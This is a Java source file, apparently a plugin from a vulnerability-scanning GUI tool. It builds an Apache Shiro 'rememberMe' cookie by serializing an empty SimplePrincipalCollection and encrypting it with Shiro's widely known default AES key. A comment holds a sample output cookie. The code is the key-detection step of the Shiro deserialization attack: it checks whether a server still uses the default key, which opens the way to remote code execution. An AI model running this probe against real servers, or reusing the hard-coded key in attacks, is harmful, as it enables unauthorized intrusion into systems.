package vulgui.deser.plugins.keytest;
import com.mchange.v2.ser.SerializableUtils;
import org.apache.shiro.subject.SimplePrincipalCollection;
import vulgui.utils.AesUtil;
import javax.xml.bind.DatatypeConverter;

public class KeyEcho {
    public static Object getObject() {
        return new SimplePrincipalCollection();
    }

    public static void main(String[] args) throws Exception {
        // 实例化 SimplePrincipalCollection
        Object keyObject = KeyEcho.getObject();
        // 将对象序列化为字节型数组
        byte[] serpayload = SerializableUtils.toByteArray(keyObject);
        // 使用默认密钥进行对数据进行AES加密
        byte[] bkey = DatatypeConverter.parseBase64Binary("kPH+bAxk5D2deZiIxcaaaA==");

        byte[] encryptpayload = AesUtil.encrypt(serpayload, bkey);
        // 对加密后的数据进行Base64编码
        System.out.println("rememberMe=" + DatatypeConverter.printBase64Binary(encryptpayload));
        // rememberMe=jOeeLZoXzjiAWCY2w75Y72xmIYWJX4rOV99RPvhgiRGEHHBurBDCg9UtLh0rjEXtMShj1ocNK7XbLuYT8hI7FgIlhtqXSG0mU5Mr1hCApGu05Me7qOd9OpYEBE0Gaw+8EzxgQf8X8OGgmf6wdDC6rWkzUzd2MazvPwVz1Jbk3oNRtrfi2/N+XpjAHCX0U2S2
    }
}
